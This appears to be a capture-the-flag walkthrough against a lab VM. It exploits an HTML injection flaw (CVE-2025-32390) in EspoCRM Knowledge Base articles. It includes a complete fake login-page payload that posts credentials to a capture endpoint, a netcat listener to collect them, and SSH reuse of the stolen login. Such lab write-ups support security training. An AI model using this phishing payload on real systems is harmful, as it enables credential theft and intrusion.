# EspoCRM CVE-2025-32390 Walkthrough

## Enumeration

### Nmap Scan

```
nmap -sC -sV -A -O -p- 192.168.1.104
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 20:47 PDT
Nmap scan report for 192.168.1.104
Host is up (0.0040s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1f:72:ad:28:65:80:46:b4:9d:e0:49:b1:1f:10:8b:8e (ECDSA)
|_  256 d7:20:a0:37:1c:17:6c:a3:69:ea:f3:02:c2:b1:94:fc (ED25519)
443/tcp  open  http    Apache httpd 2.4.58
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
8082/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: EspoCRM
9000/tcp open  http    BaseHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: BaseHTTP/0.6 Python/3.12.3
|_http-title: Link Processor
MAC Address: 08:00:27:A1:BC:30 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   3.96 ms 192.168.1.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.31 seconds

```

## Exploitation

### Vulnerability Summary

EspoCRM versions prior to 9.0.8 are vulnerable to HTML injection in Knowledge Base (KB) articles. Authenticated users with "read" privileges can create malicious articles that mimic legitimate login pages. When unsuspecting users enter credentials into these fake forms, the attacker captures them in plaintext.

This vulnerability can be used for:
- Phishing login credentials from unsuspecting users
- Imitating login portals of EspoCRM or even other enterprise applications
- Leveraging trust in KB content to execute social engineering attacks

> **Patched in:** v9.0.8

### Steps to Exploit

1. **Create a KB Article** titled `test` and paste the following HTML in the "Code" view:

    ````html
    <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f0f0f0; z-index: 9999; display: flex; justify-content: center; align-items: center;">
        <div id="login" class="panel panel-default block-center-sm">
            <div class="panel-heading">
                <div class="logo-container">
                    <img src="client/img/logo-light.svg" class="logo">
                </div>
            </div>
            <div class="panel-body">
                <form id="login-form" action="http://localhost/capture" method="POST">
                    <div class="form-group cell" data-name="username">
                        <label for="field-username">Username</label>
                        <input type="text" name="username" id="field-userName" class="form-control">
                    </div>
                    <div class="form-group cell" data-name="password">
                        <label for="login">Password</label>
                        <input type="password" name="password" id="field-password" class="form-control">
                    </div>
                    <div class="margin-top-2x cell" data-name="submit">
                        <button type="submit" class="btn btn-primary btn-s-wide">Log in</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    ````

2. Save and publish the article using the **`</>` code view** (second-last icon on the editor).
3. Copy the article link.
4. Start a listener to capture credentials:

    ```bash
    nc -lvnp 80
    ```

5. Submit the phishing article URL to `http://localhost:9000` with attacker ip (ie."-http://localhost:8082/#KnowledgeBaseArticle/view/123?attacker=192.168.1.100").
6. Wait for the victim to enter credentials they will be captured in your Netcat listener.
7. Use the credentials to SSH into the server:

    ```bash
    ssh user@192.168.1.104
    ```

8. Grab the flag:

    ```bash
    cat /proof.txt
    ```

## Escalation

None.